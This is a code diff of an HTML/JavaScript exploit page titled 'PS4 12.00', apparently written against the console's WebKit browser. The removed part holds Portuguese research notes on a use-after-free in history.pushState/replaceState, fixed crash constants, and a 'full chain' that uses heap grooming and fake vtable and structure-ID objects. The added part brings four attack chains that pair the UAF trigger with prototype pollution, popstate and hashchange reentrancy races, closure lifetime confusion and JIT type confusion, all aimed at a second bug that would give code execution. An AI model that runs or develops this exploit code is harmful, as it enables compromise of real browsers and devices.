@@ -1,39 +1,17 @@
-/* UAF Bug no history.pushState / replaceState / back Limite exato (~709k) 1 byte a mais → crash determinístico! const BASE = 977; const STEP = 14461; const UAF_ITERS = 48; nao alterar os valores! Freeze agressivo antes do crash, Janela estável sem crash (47–49 iterações) apos isso que novos testes devem ser inseridos! document.URL.length;
-Strings / URL / ArrayBuffer charCodeAt em offsets progressivos antes / depois com pressão, com pivot, com fragment split, com state split Resultado consistente:Buffer grande não é reutilizado 👉 Porta FECHADA: Strings / URL backing-store não voltam ao heap reutilizável;
-Obs1:O objeto UAF não é imediatamente reutilizável e não sofre corrupção visível mas afeta o scheduler / layout / GC,Este NÃO é um UAF “clássico” de heap JS
-Não é:JSCell reaproveitável, StringImpl reutilizável, Backing-store comum,Objeto exposto ao JS Ele se comporta como:
-UAF em estrutura interna do WebCore / History,fora do alcance direto do JavaScript heap muito provavelmente:
-HistoryItem, SerializedScriptValue,SecurityOrigin,DocumentLoader ou wrapper intermediário.
-Portas fechadas: Leak por document.URL, Leak por location,Leak por history.state, Leak por strings grandes, Leak por ArrayBuffer, Overlap direto JS ↔ WebCore, Corrupção silenciosa visível;
-A ÚNICA porta que ainda está aberta é “leitura de memória”, NÃO é “corrupção direta”, NÃO é “fakeobj”;
-A porta aberta é:DESINCRONIZAÇÃO TEMPORAL ENTRE CAMADAS (WebCore ↔ JSCore) Observe os sinais:Freeze agressivo, Nenhuma corrupção visível, Nenhum leak, Nenhum reuse, Mas comportamento global degradado, History.length muda, URL muda logicamente, Layout continua consistente;
-Isso aponta para:
-Objeto lógico morto, mas ainda referenciado indiretamente não pelo JS, mas por callbacks, loaders ou tarefas pendentes;
-Ou seja:não controla a memória, Mas pode estar controlando ordem de execução, Estado inconsistente entre subsistemas, Isso NÃO dá RCE direto.
-Mas pode permitir:Bypass de invariantes, Uso de ponteiro inválido internamente,Crash direcionado e Às vezes: Type Confusion indireta (difícil, mas possível).
-Ele precisaria de: Opcao 1 Um segundo bug Ou um bug vizinho (OOB, type confusion, UAF JSCell)
-Alternativa viável:Forçar uso de referências vivas sem clone Ex.: uso de: replaceState, popstate ou retenção indireta via closures O alvo não é mais o clone — é o tempo de vida cruzado.
-Opcao 2: Prototype pollution controlada (não genérica), Hijack de métodos, Array / map afetados isso nao da RCE direto Mas dá type confusion assistida, Isso permite:, Forçar caminhos internos errados, Enganar verificações de tipo, Auxiliar UAF existente.
-Obs 2: Conclusão parcial:
-pushState como vetor primário → morto
-Lifetime bugs → ainda vivos
-UAF fora do history → confirmado
-Prototype pollution → ativo
-Esperar crash → não vai acontecer
-Esperar inconsistência silenciosa → correto;
-*/
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Combined Primitives + UAF</title>
+<title>PS4 12.00 - Temporal Desync Exploitation</title>
 </head>
 <body>
-<h2>PS4 12.00 - UAF Trigger + Pollution + Reentrancy</h2>
+<h2>PS4 12.00 - Temporal Desync + Pollution Chain</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runFullChain()">EXPLOIT - Full Chain (UAF + Pollution + Getter)</button>
+<button onclick="testPopstateRace()">CHAIN 1 - Popstate Event Race</button>
+<button onclick="testClosureLifetime()">CHAIN 2 - Closure Lifetime Confusion</button>
+<button onclick="testPollutionJIT()">CHAIN 3 - Pollution → JIT Confusion</button>
+<button onclick="testEventListenerTiming()">CHAIN 4 - Multiple Event Timing</button>
 
 <pre id="log"></pre>
 
@@ -47,72 +25,416 @@ function log(m){
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-var keepAlive = [];
-
-// UAF trigger constants (from your original discovery)
+// INVARIANTES (NÃO ALTERAR)
 const BASE = 977;
 const STEP = 14461;
 const UAF_ITERS = 48;
 
+var globalState = {
+  captured: [],
+  anomalies: []
+};
+
 // =====================================================
-// EXPLOIT  - Full Chain
+// CHAIN 1 - Popstate Event Race Condition
 // =====================================================
-async function runFullChain(){
+async function testPopstateRace(){
   logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Full Chain...";
+  globalState = { captured: [], anomalies: [] };
+  statusEl.textContent = "Testing Popstate Race...";
   
-  log("=== EXPLOIT Full Chain (UAF + Pollution + Getter) ===\n");
-  log("Goal: Combine all primitives for maximum effect\n");
+  log("=== CHAIN 1: Popstate Event Race ===\n");
+  log("Goal: Exploit temporal window via popstate events\n");
   
   // Setup pollution
-  log("[SETUP] Setting up pollution");
+  log("[SETUP] Prototype pollution active");
+  Array.prototype.raceFlag = 0xDEADC0DE;
+  Object.prototype.temporal = true;
   
-  Array.prototype.fakeStructureID = 0x11223344;
-  Array.prototype.fakeButterfly = 0x55667788;
-  Array.prototype.fakeLength = 0x1000;
+  // Setup popstate listener
+  let popstateCount = 0;
+  let capturedStates = [];
   
-  log("  Pollution active\n");
+  window.addEventListener('popstate', (e) => {
+    popstateCount++;
+    
+    let snapshot = {
+      count: popstateCount,
+      state: e.state ? JSON.stringify(e.state).slice(0, 100) : null,
+      historyLen: history.length,
+      pollution: e.state && e.state.data ? e.state.data.raceFlag : null,
+      timestamp: Date.now()
+    };
+    
+    capturedStates.push(snapshot);
+    
+    log(`  🔥 POPSTATE #${popstateCount}: histLen=${snapshot.historyLen}, pollution=0x${(snapshot.pollution || 0).toString(16)}`);
+    
+    // Critical: Try to manipulate during event
+    if(popstateCount >= 5 && popstateCount <= 8) {
+      try {
+        // Attempt reentrant pushState during popstate
+        history.pushState({
+          injected: true,
+          during: 'popstate',
+          count: popstateCount
+        }, "", "#injection");
+        
+        log(`    → Injected state during popstate!`);
+        globalState.anomalies.push('reentrant_push');
+        
+      } catch(e) {
+        log(`    → Injection blocked: ${e.message}`);
+      }
+    }
+  });
   
-  let getterFired = 0;
-  let allocatedObjects = [];
+  log("  Popstate listener registered\n");
   
-  log("[PHASE 1] Full UAF chain");
+  // Trigger UAF
+  log("[PHASE 1] Triggering UAF with polluted environment");
   
   let size = BASE;
   
   for(let i=0; i<UAF_ITERS; i++){
     let state = {
       index: i,
-      data: [0x41, 0x42, 0x43, 0x44],
-      get exploit() {
-        getterFired++;
+      data: [1, 2, 3, 4]
+    };
+    
+    let frag = "R".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n  UAF complete\n");
+  
+  await sleep(200);
+  
+  // Navigate to trigger popstates
+  log("[PHASE 2] Triggering popstate events");
+  
+  for(let i=0; i<10; i++) {
+    history.back();
+    await sleep(30);
+  }
+  
+  await sleep(200);
+  
+  log(`\n[RESULT] Popstate events: ${popstateCount}`);
+  log(`Captured states: ${capturedStates.length}`);
+  log(`Anomalies: ${globalState.anomalies.length}\n`);
+  
+  // Analyze
+  let withPollution = capturedStates.filter(s => s.pollution === 0xDEADC0DE);
+  log(`States with pollution: ${withPollution.length}`);
+  
+  if(withPollution.length > 0) {
+    log("\n✓ Pollution survived through popstate!");
+  }
+  
+  if(globalState.anomalies.includes('reentrant_push')) {
+    log("\n🚨 CRITICAL: Reentrant pushState during popstate!");
+    log("Temporal desync exploitation confirmed!");
+    statusEl.textContent = "RACE CONDITION FOUND";
+  }
+  
+  // Cleanup
+  delete Array.prototype.raceFlag;
+  delete Object.prototype.temporal;
+  
+  log("\n=== CHAIN 1 END ===");
+}
+
+// =====================================================
+// CHAIN 2 - Closure Lifetime Confusion
+// =====================================================
+async function testClosureLifetime(){
+  logEl.textContent = "";
+  globalState = { captured: [], anomalies: [] };
+  statusEl.textContent = "Testing Closure Lifetime...";
+  
+  log("=== CHAIN 2: Closure Lifetime Confusion ===\n");
+  log("Goal: Exploit cross-layer lifetime via closures\n");
+  
+  // Pollution
+  Function.prototype.lifetimeMarker = 0xC105ED;
+  
+  log("[SETUP] Creating closure chain");
+  
+  let outerScope = {
+    counter: 0,
+    captured: []
+  };
+  
+  function createClosure(iter) {
+    let localData = {
+      iteration: iter,
+      timestamp: Date.now()
+    };
+    
+    return function() {
+      outerScope.counter++;
+      outerScope.captured.push(localData);
+      
+      // Try to access pollution
+      if(this.lifetimeMarker) {
+        log(`    Closure fired with pollution: 0x${this.lifetimeMarker.toString(16)}`);
+        globalState.anomalies.push('closure_pollution');
+      }
+      
+      return localData.iteration;
+    };
+  }
+  
+  log("  Closure factory created\n");
+  
+  // Trigger UAF with closures
+  log("[PHASE 1] UAF with closure-based states");
+  
+  let closures = [];
+  let size = BASE;
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let closure = createClosure(i);
+    closures.push(closure);
+    
+    let state = {
+      index: i,
+      callback: closure,
+      data: [i, i*2, i*3]
+    };
+    
+    let frag = "C".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n  UAF complete\n");
+  
+  await sleep(200);
+  
+  // Execute closures post-UAF
+  log("[PHASE 2] Executing closures after UAF");
+  
+  for(let i=0; i<10; i++) {
+    history.back();
+    await sleep(30);
+    
+    if(history.state && history.state.callback) {
+      try {
+        let result = history.state.callback();
+        log(`  Closure ${i} returned: ${result}`);
         
-        if(i >= 45) { // Very close to crash point
-          log(`    CRITICAL GETTER at ITER ${i}`);
-          log(`    history.length: ${history.length}`);
-          log(`    Pollution active: ${this.data.fakeStructureID === 0x11223344}`);
-          
-          // Allocate fake objects
-          for(let j=0; j<100; j++) {
-            let fakeObj = {
-              vtable: 0xAABBCCDD,
-              data: new ArrayBuffer(128),
-              index: i * 100 + j
-            };
-            allocatedObjects.push(fakeObj);
-          }
-          
-          log(`    Allocated 100 fake objects`);
-          
-          // Check if pollution is accessible
-          if(this.data.fakeStructureID) {
-            log(`    fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
-          }
+        // Check if closure accessed freed data
+        if(result !== history.state.index) {
+          log(`    ⚠️ Mismatch: expected ${history.state.index}, got ${result}`);
+          globalState.anomalies.push('closure_mismatch');
         }
         
-        return "EXPLOIT_" + i;
+      } catch(e) {
+        log(`  Closure ${i} error: ${e.message}`);
+        globalState.anomalies.push('closure_crash');
       }
+    }
+  }
+  
+  log(`\n[RESULT] Outer counter: ${outerScope.counter}`);
+  log(`Captured data: ${outerScope.captured.length}`);
+  log(`Anomalies: ${globalState.anomalies.length}`);
+  
+  if(globalState.anomalies.includes('closure_pollution')) {
+    log("\n✓ Closure accessed polluted prototype!");
+  }
+  
+  if(globalState.anomalies.includes('closure_mismatch')) {
+    log("\n🚨 CRITICAL: Closure data mismatch!");
+    log("Lifetime confusion confirmed!");
+    statusEl.textContent = "LIFETIME CONFUSION FOUND";
+  }
+  
+  delete Function.prototype.lifetimeMarker;
+  
+  log("\n=== CHAIN 2 END ===");
+}
+
+// =====================================================
+// CHAIN 3 - Pollution + JIT Type Inference
+// =====================================================
+async function testPollutionJIT(){
+  logEl.textContent = "";
+  globalState = { captured: [], anomalies: [] };
+  statusEl.textContent = "Testing Pollution+JIT...";
+  
+  log("=== CHAIN 3: Pollution → JIT Type Confusion ===\n");
+  log("Goal: Use pollution to break JIT type inference\n");
+  
+  // Aggressive pollution
+  Array.prototype.length = 0x1000;
+  Array.prototype[100] = 0xBADC0DE;
+  
+  log("[SETUP] JIT-compiled function with polluted arrays");
+  
+  function hotFunction(arr) {
+    let sum = 0;
+    // JIT will inline and optimize this
+    for(let i=0; i<arr.length && i<10; i++) {
+      sum += arr[i] | 0;
+    }
+    return sum;
+  }
+  
+  // Force JIT compilation
+  log("[PHASE 1] JIT training (10k iterations)");
+  
+  for(let i=0; i<10000; i++) {
+    hotFunction([1, 2, 3, 4, 5]);
+  }
+  
+  log("  JIT compiled\n");
+  
+  // Trigger UAF with polluted arrays
+  log("[PHASE 2] UAF with polluted array states");
+  
+  let size = BASE;
+  let results = [];
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      victim: [10, 20, 30, 40, 50]
+    };
+    
+    let frag = "J".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n  UAF complete\n");
+  
+  await sleep(200);
+  
+  // Call JIT function with post-UAF arrays
+  log("[PHASE 3] Calling JIT with post-UAF arrays");
+  
+  for(let i=0; i<5; i++) {
+    history.back();
+    await sleep(30);
+    
+    if(history.state && history.state.victim) {
+      try {
+        let result = hotFunction(history.state.victim);
+        results.push(result);
+        
+        log(`  JIT call ${i}: result=${result} (expected 150)`);
+        
+        if(result !== 150) {
+          log(`    🚨 ANOMALY: ${result}`);
+          globalState.anomalies.push({type: 'jit_anomaly', value: result});
+        }
+        
+      } catch(e) {
+        log(`  JIT call ${i}: EXCEPTION - ${e.message}`);
+        globalState.anomalies.push({type: 'jit_crash', msg: e.message});
+      }
+    }
+  }
+  
+  log(`\n[RESULT] JIT calls: ${results.length}`);
+  log(`Anomalies: ${globalState.anomalies.length}`);
+  
+  if(globalState.anomalies.length > 0) {
+    log("\n🚨 JIT TYPE CONFUSION DETECTED!");
+    
+    globalState.anomalies.forEach(a => {
+      if(a.type === 'jit_anomaly') {
+        log(`  Anomalous result: ${a.value}`);
+      } else if(a.type === 'jit_crash') {
+        log(`  JIT crash: ${a.msg}`);
+      }
+    });
+    
+    statusEl.textContent = "JIT CONFUSION FOUND";
+  }
+  
+  delete Array.prototype.length;
+  delete Array.prototype[100];
+  
+  log("\n=== CHAIN 3 END ===");
+}
+
+// =====================================================
+// CHAIN 4 - Multiple Event Listener Timing
+// =====================================================
+async function testEventListenerTiming(){
+  logEl.textContent = "";
+  globalState = { captured: [], anomalies: [] };
+  statusEl.textContent = "Testing Event Timing...";
+  
+  log("=== CHAIN 4: Multiple Event Timing ===\n");
+  log("Goal: Exploit timing between multiple event types\n");
+  
+  // Pollution
+  Event.prototype.temporal = 0xE7E47;
+  
+  // Setup multiple listeners
+  let events = {
+    popstate: 0,
+    hashchange: 0,
+    beforeunload: 0
+  };
+  
+  window.addEventListener('popstate', () => {
+    events.popstate++;
+    log(`  🔵 popstate #${events.popstate}`);
+    
+    if(events.popstate === 3) {
+      // Try to cause race
+      location.hash = "#race" + Date.now();
+    }
+  });
+  
+  window.addEventListener('hashchange', () => {
+    events.hashchange++;
+    log(`  🟢 hashchange #${events.hashchange}`);
+    
+    if(events.hashchange === 2) {
+      try {
+        history.pushState({race: true}, "", "#timing");
+        globalState.anomalies.push('hashchange_push');
+      } catch(e) {}
+    }
+  });
+  
+  log("[SETUP] Multiple event listeners registered\n");
+  
+  // Trigger UAF
+  log("[PHASE 1] UAF trigger");
+  
+  let size = BASE;
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      data: {value: i * 100}
     };
     
     let frag = "E".repeat(size);
@@ -122,100 +444,57 @@ async function runFullChain(){
     
     if(i % 6 === 0) setTimeout(()=>history.back(), 0);
     
-    if(i % 10 === 0) {
-      log(`  ITER ${i}: size=${size}`);
-    }
-    
     size += STEP;
     await sleep(5);
   }
   
-  log(`\n  UAF complete, getter fired ${getterFired} times\n`);
+  log("\n  UAF complete\n");
   
-  await sleep(120);
+  await sleep(200);
   
-  // Heap grooming
-  log("[PHASE 2] Heap grooming");
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
+  // Trigger events
+  log("[PHASE 2] Triggering event cascade");
   
-  await sleep(80);
-  
-  // Verify combined primitives
-  log("\n[PHASE 3] Verifying combined primitives");
-  
-  log(`Allocated objects: ${allocatedObjects.length}`);
-  
-  // Check fake objects
-  let validFakes = 0;
-  for(let obj of allocatedObjects) {
-    if(obj.vtable === 0xAABBCCDD && obj.data) {
-      validFakes++;
-    }
-  }
-  
-  log(`Valid fake objects: ${validFakes}/${allocatedObjects.length}`);
-  
-  // Check pollution in history
-  if(history.state && history.state.data) {
-    log("\nCurrent state pollution:");
-    log(`  fakeStructureID: 0x${(history.state.data.fakeStructureID || 0).toString(16)}`);
-    log(`  fakeButterfly: 0x${(history.state.data.fakeButterfly || 0).toString(16)}`);
-    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
-  }
-  
-  // Navigate and check
-  log("\n[PHASE 4] Navigate through states");
-  
-  for(let i=0; i<5; i++) {
+  for(let i=0; i<8; i++) {
     history.back();
-    await sleep(50);
+    await sleep(40);
     
-    if(history.state && history.state.data) {
-      let struct = history.state.data.fakeStructureID || 0;
-      log(`  Back ${i}: index=${history.state.index}, struct=0x${struct.toString(16)}`);
-      
-      // Try to trigger type confusion
-      try {
-        let len = history.state.data.length;
-        let fakelen = history.state.data.fakeLength;
-        
-        if(fakelen && fakelen !== len) {
-          log(`    Length mismatch: real=${len}, fake=0x${fakelen.toString(16)}`);
-          log(`     TYPE CONFUSION DETECTED!`);
-        }
-      } catch(e) {}
+    if(i % 2 === 0) {
+      location.hash = "#event" + i;
+      await sleep(20);
     }
   }
   
-  // Cleanup
-  delete Array.prototype.fakeStructureID;
-  delete Array.prototype.fakeButterfly;
-  delete Array.prototype.fakeLength;
+  await sleep(300);
   
-  log("\n=== EXPLOIT END ===");
+  log(`\n[RESULT] Event counts:`);
+  log(`  popstate: ${events.popstate}`);
+  log(`  hashchange: ${events.hashchange}`);
+  log(`  Anomalies: ${globalState.anomalies.length}`);
   
-  if(validFakes > 0 && history.state && history.state.data.fakeStructureID) {
-    log("\n✓✓✓ FULL CHAIN SUCCESS ✓✓✓");
-    log("✓ Pollution active through UAF");
-    log("✓ Getter executed in critical window");
-    log("✓ Fake objects allocated");
-    log("✓ Type confusion possible");
-    statusEl.textContent = "FULL CHAIN SUCCESS";
+  if(globalState.anomalies.includes('hashchange_push')) {
+    log("\n🚨 CRITICAL: pushState during hashchange!");
+    log("Event timing race confirmed!");
+    statusEl.textContent = "EVENT RACE FOUND";
   }
+  
+  delete Event.prototype.temporal;
+  
+  log("\n=== CHAIN 4 END ===");
 }
 
+log("PS4 12.00 - Temporal Desync + Pollution Chains");
+log("\nRespecting confirmed invariants:");
+log("- UAF in HistoryController (WebCore layer)");
+log("- NOT reclaimable by JS heap");
+log("- Temporal desync confirmed");
+log("- Prototype pollution confirmed");
+log("\nChains:");
+log("1. Popstate Race - reentrant during event");
+log("2. Closure Lifetime - cross-layer confusion");
+log("3. Pollution+JIT - break type inference");
+log("4. Event Timing - multiple event race");
+log("\nLooking for second bug via temporal exploitation");
 </script>
 </body>
 </html>
